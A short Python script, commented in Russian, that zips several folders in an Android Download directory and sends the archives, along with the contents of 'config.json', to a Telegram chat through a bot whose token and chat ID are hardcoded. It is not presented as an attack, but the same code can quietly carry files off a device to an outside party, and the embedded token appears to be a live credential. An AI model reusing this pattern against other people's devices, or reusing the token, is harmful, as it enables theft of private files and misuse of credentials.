import os
import asyncio
import shutil
from telegram import Bot

token = '7346673656:AAFqLxeJkGlysL32hyUA74ucU7g0nsPvVWc'  # Замените на ваш токен бота
chat_id = '652950846'  # Замените на ваш chat_id

async def send_file_and_message(file_path, message_file_path):
    bot = Bot(token=token)

    # Чтение текста сообщения из файла
    if os.path.exists(message_file_path):
        with open(message_file_path, 'r', encoding='utf-8') as message_file:
            message = message_file.read()
    else:
        print(f"Ошибка: файл сообщения не найден.")
        return

    # Отправка сообщения
    await bot.send_message(chat_id=chat_id, text=message)

    # Отправка файла
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            await bot.send_document(chat_id=chat_id, document=file)
    else:
        print(f"Ошибка: архив не найден.")

def create_archive(folder_path, archive_name):
    # Создание ZIP-архива из указанной папки
    shutil.make_archive(archive_name, 'zip', folder_path)

if __name__ == '__main__':
    folders_to_archive = [
        '/storage/emulated/0/Download/test1',  # Укажите путь к первой папке для архивирования
        '/storage/emulated/0/Download/test2',  # Укажите путь ко второй папке для архивирования
        '/storage/emulated/0/Download/test3'  # Укажите путь к третьей папке для архивирования
    ]
    
    message_file_to_read = 'config.json'  # Укажите имя файла с сообщением

    # Создание архивов и отправка их
    for i, folder in enumerate(folders_to_archive, start=1):
        archive_name = f'archive_{i}'  # Имя архива без расширения
        
        # Создание архива
        create_archive(folder, archive_name)

        # Запускаем асинхронный цикл для отправки сообщения и файла
        asyncio.run(send_file_and_message(f'{archive_name}.zip', message_file_to_read))